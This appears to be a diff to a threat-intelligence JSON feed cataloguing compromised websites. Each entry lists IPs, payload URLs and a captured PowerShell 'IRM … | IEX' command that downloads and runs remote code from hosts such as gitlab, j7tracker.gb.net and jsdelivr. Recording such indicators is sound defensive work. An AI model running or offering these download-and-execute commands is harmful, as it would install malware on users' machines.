@@ -1,5 +1,64 @@
 [
   {
+    "UrlDomain": "canconnectmedia.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "132.148.178.228"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoauwbm1yu70oml45lo3jkx",
+    "ScannedAt": "2026-11-20T01:27:50.628000+00:00"
+  },
+  {
+    "UrlDomain": "mitsubishikimlienhanoi.vn",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "36.50.26.24"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoarw6c1ytk0omlfgbkqvw7",
+    "ScannedAt": "2026-11-20T01:25:30.403000+00:00"
+  },
+  {
+    "UrlDomain": "zekoturizm.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "IP": [
+      "37.18.61.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "ReportId": "cmwo9kdgz1ys80omlr22sxrni",
+    "ScannedAt": "2026-11-20T00:51:39.997000+00:00"
+  },
+  {
     "UrlDomain": "jordan-commu.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -18471,22 +18530,5 @@
     ],
     "ReportId": "cmwa78v3607w70omluib5p702",
     "ScannedAt": "2026-11-10T04:37:57.278000+00:00"
-  },
-  {
-    "UrlDomain": "grozco.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "195.211.47.67"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmw9zizln07hd0oml2za1wlqb",
-    "ScannedAt": "2026-11-10T01:01:52.755000+00:00"
   }
 ]
